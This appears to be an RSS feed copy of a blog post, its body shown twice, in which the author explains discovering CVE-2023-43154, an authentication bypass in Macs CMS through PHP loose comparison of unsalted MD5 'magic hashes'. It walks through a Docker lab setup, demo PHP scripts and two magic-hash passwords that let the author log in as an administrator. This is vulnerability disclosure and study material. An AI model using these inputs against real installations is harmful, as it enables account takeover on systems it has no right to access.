I visit the &lt;code&gt;login()&lt;/code&gt; function within the CMS plugin located at &lt;code&gt;plugins/CMS/controllers/CMS.php&lt;/code&gt; to discover that in order for the user to log in successfully, they must already be logged in as admin or the method &lt;code&gt;isValidLogin()&lt;/code&gt; must return &lt;code&gt;true&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*cf13zlJVAiQBLn4ZHPGXxg.png&#34; alt=&#34;&#34;  /&gt;

Since the return value of the function shown above must the &lt;code&gt;true&lt;/code&gt; and the value returned is stored in the variable &lt;code&gt;$loggedIn&lt;/code&gt;, I annotated the occurrences of &lt;code&gt;$loggedIn&lt;/code&gt; to highlight the execution flow that must be triggered in order to achieve the intended return value. From here, I began to work backwards.&lt;/p&gt;
&lt;p&gt;For &lt;code&gt;$loggedIn&lt;/code&gt; to be set to &lt;code&gt;true&lt;/code&gt;, a conditional statement must be met. Luckily, I noticed that a loose comparison was being made for both of the comparisons that can lead to the value being set to &lt;code&gt;true&lt;/code&gt;. This article will not be covering PHP loose comparison vulnerabilities in-depth, however, I will give a high-level overview of the relevant details of loose comparison and more detail can be found at &lt;a href=&#34;https://xavibel.com/2020/01/22/usebb-forum-php-type-juggling-vulnerability/&#34;&gt;this&lt;/a&gt; resource.&lt;/p&gt;
&lt;h2 id=&#34;loose-comparison-logic&#34;&gt;Loose Comparison Logic&lt;/h2&gt;
&lt;p&gt;In PHP, loose comparisons refer to the use of two equal signs (&lt;code&gt;==&lt;/code&gt;). This differs from a strict comparison (&lt;code&gt;===&lt;/code&gt;) in the way that two operands are compared. A loose comparison will attempt to interpret the operands and, if deemed applicable, convert them to a data type that allows for improved compatibility between them.&lt;/p&gt;
&lt;p&gt;The following example illustrates the difference between a strict and loose comparison in PHP. I make two comparisons between the string &lt;code&gt;“0e3264578”&lt;/code&gt; and the integer &lt;code&gt;0&lt;/code&gt;. The first is a loose comparison and the second is strict. The result of the comparison between the string and integer then outputs whether the comparison returned &lt;code&gt;true&lt;/code&gt; or &lt;code&gt;false.&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?php  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;if (&amp;#34;0e3264578&amp;#34; == 0) {  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; echo &amp;#34;Loose comparison returns True\n&amp;#34;;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} else {  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; echo &amp;#34;Loose comparison returns False\n&amp;#34;;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;if (&amp;#34;0e3264578&amp;#34; === 0) {  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; echo &amp;#34;Strict comparison returns True&amp;#34;;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} else {  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; echo &amp;#34;Strict comparison returns False&amp;#34;;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I save the above program as &lt;code&gt;test-comparison.php&lt;/code&gt; and execute the code to discover that the first, loose comparison returned &lt;code&gt;true&lt;/code&gt; and the second, strict comparison returned &lt;code&gt;false&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*hSnIWCdKDG--lBGveEolvQ.png&#34; alt=&#34;&#34;  /&gt;

To understand why this is the case, it is important to understand what PHP is doing during a loose comparison like the one in this example. An integer followed by the letter &lt;code&gt;e&lt;/code&gt; and additional digits is interpreted by PHP as an integer raised to an exponential power. In this case, &lt;code&gt;“0e3264578”&lt;/code&gt; was interpreted as 0 raised to the &lt;code&gt;3264578&lt;/code&gt; power. Of course, 0³²⁶⁴⁵⁷⁸ is equal to 0, hence the return value of &lt;code&gt;true&lt;/code&gt; when comparing &lt;code&gt;“0e3264578”&lt;/code&gt; to &lt;code&gt;0.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This did not return &lt;code&gt;true&lt;/code&gt; in the strict comparison because PHP was not interpreting the string as an integer like it was in the loose comparison. It took the operands for their literal value, which was a string and an integer of different values, which are not the same.&lt;/p&gt;
&lt;p&gt;This can be abused in the context of a login form where two password hashes that are both 0-like such as “0e123” and “0e345” can be loosely compared and result in a &lt;code&gt;true&lt;/code&gt; outcome since 0¹²³ and 0³⁴⁵ both equal the same thing: 0. As a result, PHP would signal that the hashes are equivalent, allowing for a successful login, when they are not.&lt;/p&gt;
&lt;h2 id=&#34;formulating-theexploit&#34;&gt;Formulating the Exploit&lt;/h2&gt;
&lt;p&gt;To exploit this vulnerability, I needed to fully understand what the input in &lt;code&gt;isValidLogin()&lt;/code&gt; consists of. It is evident in the &lt;code&gt;login()&lt;/code&gt; function that there is manipulation done on the received password before it is passed to the &lt;code&gt;isValidLogin()&lt;/code&gt; function for comparison with previously stored credentials.&lt;/p&gt;
&lt;p&gt;Revisiting the initial function call, it appears that the user-controlled parameter &lt;code&gt;password&lt;/code&gt; is being passed through an additional method called &lt;code&gt;encrypt()&lt;/code&gt; before being passed to &lt;code&gt;isValidLogin().&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$this-&amp;gt;isValidLogin(Post::getByKey(&amp;#39;username&amp;#39;), $this-&amp;gt;encrypt(Post::getByKey(&amp;#39;password&amp;#39;)) )
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Visiting this function reveals that it simply returns an unsalted MD5 hash of the parameter passed into it, in this case, &lt;code&gt;password&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*a04RNWeykCU4OPm-t3CWSQ.png&#34; alt=&#34;&#34;  /&gt;

I did more digging to uncover that the password saved in the database was also hashed. This means that in the &lt;code&gt;isValidLogin()&lt;/code&gt; function, the password comparison is made between two MD5 hashes like the following:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$account[&amp;#39;password&amp;#39;] == $password // -&amp;gt; md5(user\_inputted\_password) == stored\_md5\_password\_hash
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As explained before, in PHP, “0e123..” will be interpreted as 0 in a loose comparison. Hashes that follow this format (&lt;code&gt;0e&lt;/code&gt; followed by digits) are known as magic hashes. Theoretically, if we were to compare two magic hashes together, the result would be &lt;code&gt;true&lt;/code&gt; and the &lt;code&gt;$loggedIn&lt;/code&gt; variable would subsequently be set to true and returned to the &lt;code&gt;login()&lt;/code&gt; function resulting in a success authentication.&lt;/p&gt;
&lt;p&gt;I will first verify this with a sample PHP script that compares two different zero-like strings.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?php  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;if (&amp;#34;0e123123123&amp;#34; == &amp;#34;0e456456456&amp;#34;) {  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; echo &amp;#34;Comparison returns True\n&amp;#34;;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} else {  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; echo &amp;#34;Comparison returns False\n&amp;#34;;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As expected, executing the script results in a &lt;code&gt;true&lt;/code&gt; comparison.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*FDZGbf2o3aYsiVJnTI0kkQ.png&#34; alt=&#34;&#34;  /&gt;

Now, all that is left to do is reproduce this in the CMS application. Using my &lt;a href=&#34;https://github.com/spaze/hashes/blob/master/md5.md&#34;&gt;cheat sheet of magic hashes&lt;/a&gt;, I identify two magic hashes to use:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fh70QgaGIfYM:0e564472166873750526572156675923  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hello10672785079:0e859173238273273455651853557908
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I create an test user called &lt;code&gt;test-admin&lt;/code&gt; with the first password &lt;code&gt;fh70QgaGIfYM&lt;/code&gt;. The intercepted request can be seen in BurpSuite on the right.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*dXa4uMZw2kGSoG3mqvgIeg.png&#34; alt=&#34;&#34;  /&gt;

Finally, for the moment of truth, I log out of my admin account and try to log in with the second password &lt;code&gt;hello10672785079&lt;/code&gt;. The resulting request is shown below.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*caUiDSInsQ6owr2iKErNVQ.png&#34; alt=&#34;&#34;  /&gt;

The intercepted response of my login attempt returns a status code of 200 and redirects me to the home page, indicating a successful login.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*rGwiYW55r2P_iAi36kXF7w.png&#34; alt=&#34;&#34;  /&gt;

With my new administrator privileges, I can change configuration information about the site including the &lt;strong&gt;password of the other administrator&lt;/strong&gt;.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*H-JRAsYSEblniMQgPYm9Ew.png&#34; alt=&#34;&#34;  /&gt;

Conclusion&lt;/h1&gt;
&lt;p&gt;I was able to log in to an administrator account using one of many incorrect passwords that work to bypass authentication. This opened the door to potential breaches in confidentiality, integrity, and availability.&lt;/p&gt;
&lt;p&gt;As stated in my original PoC, there are limitations to this since the admin password hash must already be a 0-like string in PHP and the username must be previously known, 0-like, or easy to guess. The username can be enumerated on the platform through other means, so this is not as big of an issue.&lt;/p&gt;
&lt;p&gt;Thank you to everyone who read this far and I hope that you found value in this article!&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*3hIZtNoj0lfZ86_b" alt=""  />

<em><a href="https://images.pexels.com/photos/5483149/pexels-photo-5483149.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1">https://images.pexels.com/photos/5483149/pexels-photo-5483149.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1</a></em></p>
<h1 id="introduction">Introduction</h1>
<p>Discovering a CVE was always an idea that enticed me, but I had no idea how to achieve it. Encountering the authentication bypass that I will explain in this article was both unexpected and deeply inspiring. In my preparation for the OSWE, I decided to practice identifying the exam vulnerabilities in real, open-source applications, which would both give me practice for the exam and enable me to contribute to the security community. The first of these applications is the subject of this article.</p>
<h2 id="prerequisite-knowledge">Prerequisite Knowledge</h2>
<ul>
<li>A basic understanding of scripting languages and web applications</li>
</ul>
<h2 id="setup">Setup</h2>
<p>I decided to audit <a href="https://www.opensourcecms.com/macs-cms/">Macs Framework v1.14f</a>. The reasoning behind this target choice is that I wanted to gain familiarity with analyzing large code bases before challenging myself with a more modern target in order to establish a robust methodology. Additionally, Macs CMS seemed like a target that was compatible with the machines used in the OSWE certification exams and the additional preparation would increase my chance of passing on the first attempt.</p>
<p>My first attempt to launch the web application locally was unsuccessful. I was unable to install the deprecated PHP5 version on my host OS. As a solution, I decided to run the application in a Docker container. I made a <code>Dockerfile</code> in the <code>Application/</code> folder of the source code. I was unable to find documentation or online resources as to the process of configuring this CMS, so after some tweaking, I composed the following <code>Dockerfile</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>FROM php:<span style="color:#ae81ff">5.6</span><span style="color:#f92672">-</span>apache  
</span></span><span style="display:flex;"><span>COPY <span style="color:#f92672">.</span> <span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#f92672">/</span>  
</span></span><span style="display:flex;"><span>WORKDIR <span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># add working apt sources  </span>
</span></span><span style="display:flex;"><span>RUN echo deb http:<span style="color:#f92672">//</span>archive<span style="color:#f92672">.</span>debian<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>debian<span style="color:#f92672">/</span> stretch main <span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>apt<span style="color:#f92672">/</span>sources<span style="color:#f92672">.</span>list  
</span></span><span style="display:flex;"><span>RUN echo deb http:<span style="color:#f92672">//</span>archive<span style="color:#f92672">.</span>debian<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>debian<span style="color:#f92672">-</span>security<span style="color:#f92672">/</span> stretch<span style="color:#f92672">/</span>updates main <span style="color:#f92672">&gt;&gt;</span> <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>apt<span style="color:#f92672">/</span>sources<span style="color:#f92672">.</span>list  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># install mysql  </span>
</span></span><span style="display:flex;"><span>RUN apt<span style="color:#f92672">-</span>get update <span style="color:#f92672">&amp;&amp;</span> \  
</span></span><span style="display:flex;"><span> apt<span style="color:#f92672">-</span>get install <span style="color:#f92672">-</span>y mysql<span style="color:#f92672">-</span>server <span style="color:#f92672">&amp;&amp;</span> \  
</span></span><span style="display:flex;"><span> apt<span style="color:#f92672">-</span>get clean  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># remove symlinks on error logs  </span>
</span></span><span style="display:flex;"><span>RUN unlink <span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>log<span style="color:#f92672">/</span>apache2<span style="color:#f92672">/</span>error<span style="color:#f92672">.</span>log <span style="color:#f92672">&amp;&amp;</span> \  
</span></span><span style="display:flex;"><span> unlink <span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>log<span style="color:#f92672">/</span>apache2<span style="color:#f92672">/</span>access<span style="color:#f92672">.</span>log  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># remove .htaccess file because it isn&#39;t needed and it caused issues  </span>
</span></span><span style="display:flex;"><span>RUN rm <span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#f92672">/.</span>htaccess  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># change ownership of web files to www-data  </span>
</span></span><span style="display:flex;"><span>RUN chown www<span style="color:#f92672">-</span>data <span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html <span style="color:#f92672">-</span>R <span style="color:#f92672">&amp;&amp;</span> \  
</span></span><span style="display:flex;"><span> chmod <span style="color:#ae81ff">755</span> <span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html <span style="color:#f92672">-</span>R  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># start mysql and apache2  </span>
</span></span><span style="display:flex;"><span>RUN service mysql restart  
</span></span><span style="display:flex;"><span>RUN service apache2 restart
</span></span></code></pre></div><p>I then built the new image and ran it as a container named <code>macs-cms.</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cd Macs-CMS/Application  
</span></span><span style="display:flex;"><span>sudo docker build -t macs-cms .  
</span></span><span style="display:flex;"><span>sudo docker run -it -exec --name macs-cms macs-cms /bin/bash
</span></span></code></pre></div><p>After these commands were complete, I was able to visit the live CMS at <code>&lt;http://172.17.0.2&gt;.</code></p>
<h1 id="finding-cve-202343154">Finding CVE-2023–43154</h1>
<p>My first encounter with the source code aimed to identify key metadata that would provide context as to which vulnerabilities to look for. By briefly browsing the project in <a href="https://vscodium.com/">VSCodium</a>’s project explorer and running enumeration commands on the Docker container, I was able to deduce the following information:</p>
<ul>
<li><strong>Programming language:</strong> PHP 5.6</li>
<li><strong>Architecture:</strong> Model-View-Controller (MVC)</li>
<li><strong>Routes:</strong> Organized with the following pattern: <code>/&lt;controller_name&gt;/&lt;function&gt;</code></li>
<li><strong>Database:</strong> MariaDB 10.1.48</li>
<li><strong>Operating System:</strong> Debian GNU/Linux 9</li>
</ul>
<p>Informed on the technology stack, I was able to focus my research on vulnerabilities that are common in PHP and MariaDB, one of which being PHP type confusion.</p>
<p>I proceeded with navigating the web application and monitoring my HTTP traffic through my BurpSuite web proxy while taking notes on details that I deemed interesting for future vulnerability analysis. In particular, I honed in on the authentication functionality because of its potential to be high severity.</p>
<p>Upon my login attempt as admin, I noticed the following traffic:</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*Pkekiat_JJKGXIKOXuDGpQ.png" alt=""  />

<em>Intercepted login request</em></p>
<p>The URI, excluding the prefix <code>index.php</code>, was <code>/main/cms/login</code>. My interpretation of this route is that the <code>mainController</code> is initially called, which loads to the <code>CMS</code> plugin with <code>$this-&gt;cms = $this-&gt;loadPlugin('CMS');</code>. Then, the <code>login()</code> function is invoked within the CMS plugin with access to the HTTP POST data, which is globally accessible.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*YiIswaTUkWAQg-oNymcuAg.png" alt=""  />

I visit the <code>login()</code> function within the CMS plugin located at <code>plugins/CMS/controllers/CMS.php</code> to discover that in order for the user to log in successfully, they must already be logged in as admin or the method <code>isValidLogin()</code> must return <code>true</code>.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*cf13zlJVAiQBLn4ZHPGXxg.png" alt=""  />

Since the return value of the function shown above must the <code>true</code> and the value returned is stored in the variable <code>$loggedIn</code>, I annotated the occurrences of <code>$loggedIn</code> to highlight the execution flow that must be triggered in order to achieve the intended return value. From here, I began to work backwards.</p>
<p>For <code>$loggedIn</code> to be set to <code>true</code>, a conditional statement must be met. Luckily, I noticed that a loose comparison was being made for both of the comparisons that can lead to the value being set to <code>true</code>. This article will not be covering PHP loose comparison vulnerabilities in-depth, however, I will give a high-level overview of the relevant details of loose comparison and more detail can be found at <a href="https://xavibel.com/2020/01/22/usebb-forum-php-type-juggling-vulnerability/">this</a> resource.</p>
<h2 id="loose-comparison-logic">Loose Comparison Logic</h2>
<p>In PHP, loose comparisons refer to the use of two equal signs (<code>==</code>). This differs from a strict comparison (<code>===</code>) in the way that two operands are compared. A loose comparison will attempt to interpret the operands and, if deemed applicable, convert them to a data type that allows for improved compatibility between them.</p>
<p>The following example illustrates the difference between a strict and loose comparison in PHP. I make two comparisons between the string <code>“0e3264578”</code> and the integer <code>0</code>. The first is a loose comparison and the second is strict. The result of the comparison between the string and integer then outputs whether the comparison returned <code>true</code> or <code>false.</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;?php  
</span></span><span style="display:flex;"><span>if (&#34;0e3264578&#34; == 0) {  
</span></span><span style="display:flex;"><span> echo &#34;Loose comparison returns True\n&#34;;  
</span></span><span style="display:flex;"><span>} else {  
</span></span><span style="display:flex;"><span> echo &#34;Loose comparison returns False\n&#34;;  
</span></span><span style="display:flex;"><span>};  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>if (&#34;0e3264578&#34; === 0) {  
</span></span><span style="display:flex;"><span> echo &#34;Strict comparison returns True&#34;;  
</span></span><span style="display:flex;"><span>} else {  
</span></span><span style="display:flex;"><span> echo &#34;Strict comparison returns False&#34;;  
</span></span><span style="display:flex;"><span>};  
</span></span><span style="display:flex;"><span>?&gt;
</span></span></code></pre></div><p>I save the above program as <code>test-comparison.php</code> and execute the code to discover that the first, loose comparison returned <code>true</code> and the second, strict comparison returned <code>false</code>.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*hSnIWCdKDG--lBGveEolvQ.png" alt=""  />

To understand why this is the case, it is important to understand what PHP is doing during a loose comparison like the one in this example. An integer followed by the letter <code>e</code> and additional digits is interpreted by PHP as an integer raised to an exponential power. In this case, <code>“0e3264578”</code> was interpreted as 0 raised to the <code>3264578</code> power. Of course, 0³²⁶⁴⁵⁷⁸ is equal to 0, hence the return value of <code>true</code> when comparing <code>“0e3264578”</code> to <code>0.</code></p>
<p>This did not return <code>true</code> in the strict comparison because PHP was not interpreting the string as an integer like it was in the loose comparison. It took the operands for their literal value, which was a string and an integer of different values, which are not the same.</p>
<p>This can be abused in the context of a login form where two password hashes that are both 0-like such as “0e123” and “0e345” can be loosely compared and result in a <code>true</code> outcome since 0¹²³ and 0³⁴⁵ both equal the same thing: 0. As a result, PHP would signal that the hashes are equivalent, allowing for a successful login, when they are not.</p>
<h2 id="formulating-theexploit">Formulating the Exploit</h2>
<p>To exploit this vulnerability, I needed to fully understand what the input in <code>isValidLogin()</code> consists of. It is evident in the <code>login()</code> function that there is manipulation done on the received password before it is passed to the <code>isValidLogin()</code> function for comparison with previously stored credentials.</p>
<p>Revisiting the initial function call, it appears that the user-controlled parameter <code>password</code> is being passed through an additional method called <code>encrypt()</code> before being passed to <code>isValidLogin().</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$this-&gt;isValidLogin(Post::getByKey(&#39;username&#39;), $this-&gt;encrypt(Post::getByKey(&#39;password&#39;)) )
</span></span></code></pre></div><p>Visiting this function reveals that it simply returns an unsalted MD5 hash of the parameter passed into it, in this case, <code>password</code>.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*a04RNWeykCU4OPm-t3CWSQ.png" alt=""  />

I did more digging to uncover that the password saved in the database was also hashed. This means that in the <code>isValidLogin()</code> function, the password comparison is made between two MD5 hashes like the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$account[&#39;password&#39;] == $password // -&gt; md5(user\_inputted\_password) == stored\_md5\_password\_hash
</span></span></code></pre></div><p>As explained before, in PHP, “0e123..” will be interpreted as 0 in a loose comparison. Hashes that follow this format (<code>0e</code> followed by digits) are known as magic hashes. Theoretically, if we were to compare two magic hashes together, the result would be <code>true</code> and the <code>$loggedIn</code> variable would subsequently be set to true and returned to the <code>login()</code> function resulting in a success authentication.</p>
<p>I will first verify this with a sample PHP script that compares two different zero-like strings.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;?php  
</span></span><span style="display:flex;"><span>if (&#34;0e123123123&#34; == &#34;0e456456456&#34;) {  
</span></span><span style="display:flex;"><span> echo &#34;Comparison returns True\n&#34;;  
</span></span><span style="display:flex;"><span>} else {  
</span></span><span style="display:flex;"><span> echo &#34;Comparison returns False\n&#34;;  
</span></span><span style="display:flex;"><span>};  
</span></span><span style="display:flex;"><span>?&gt;
</span></span></code></pre></div><p>As expected, executing the script results in a <code>true</code> comparison.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*FDZGbf2o3aYsiVJnTI0kkQ.png" alt=""  />

Now, all that is left to do is reproduce this in the CMS application. Using my <a href="https://github.com/spaze/hashes/blob/master/md5.md">cheat sheet of magic hashes</a>, I identify two magic hashes to use:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>fh70QgaGIfYM:0e564472166873750526572156675923  
</span></span><span style="display:flex;"><span>hello10672785079:0e859173238273273455651853557908
</span></span></code></pre></div><p>I create an test user called <code>test-admin</code> with the first password <code>fh70QgaGIfYM</code>. The intercepted request can be seen in BurpSuite on the right.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*dXa4uMZw2kGSoG3mqvgIeg.png" alt=""  />

Finally, for the moment of truth, I log out of my admin account and try to log in with the second password <code>hello10672785079</code>. The resulting request is shown below.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*caUiDSInsQ6owr2iKErNVQ.png" alt=""  />

The intercepted response of my login attempt returns a status code of 200 and redirects me to the home page, indicating a successful login.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*rGwiYW55r2P_iAi36kXF7w.png" alt=""  />

With my new administrator privileges, I can change configuration information about the site including the <strong>password of the other administrator</strong>.</p>
<h1 id="conclusion"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*H-JRAsYSEblniMQgPYm9Ew.png" alt=""  />

Conclusion</h1>
<p>I was able to log in to an administrator account using one of many incorrect passwords that work to bypass authentication. This opened the door to potential breaches in confidentiality, integrity, and availability.</p>
<p>As stated in my original PoC, there are limitations to this since the admin password hash must already be a 0-like string in PHP and the username must be previously known, 0-like, or easy to guess. The username can be enumerated on the platform through other means, so this is not as big of an issue.</p>
<p>Thank you to everyone who read this far and I hope that you found value in this article!</p>
]]></content:encoded>
    </item>
  </channel>
</rss>
